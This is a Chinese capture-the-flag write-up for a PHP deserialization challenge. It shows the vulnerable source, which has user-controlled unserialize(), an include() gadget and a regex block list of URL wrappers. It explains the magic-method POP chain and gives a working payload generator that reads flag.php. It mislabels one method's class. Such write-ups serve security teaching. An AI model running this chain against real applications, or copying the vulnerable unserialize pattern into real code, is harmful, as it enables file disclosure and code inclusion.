源码

```php
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

漏洞点是 Modifier 类的 append 方法，append 方法被 `__invoke()` 调用。但是 `__invoke()`方法这里的类，并没有其他方法了，所以没办法直接调用。

看 Test 类，Test 类里面的 `__get()`  魔术方法，可以将 p 设为我们构造好的 Modifier 对象。但是 `__get()` 方法又是在访问不存在的成员变量时被调用的，这里就自然而然用上了 `Test#__toString()` 方法

最终 payload

````php
<?php
class Modifier {
    protected  $var="flag.php";
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $p;
}
$a = new Show();
$b= new Show();
$a->source=$b;
$b->str=new Test();
($b->str)->p=new Modifier();
echo urlencode(serialize($a));
````













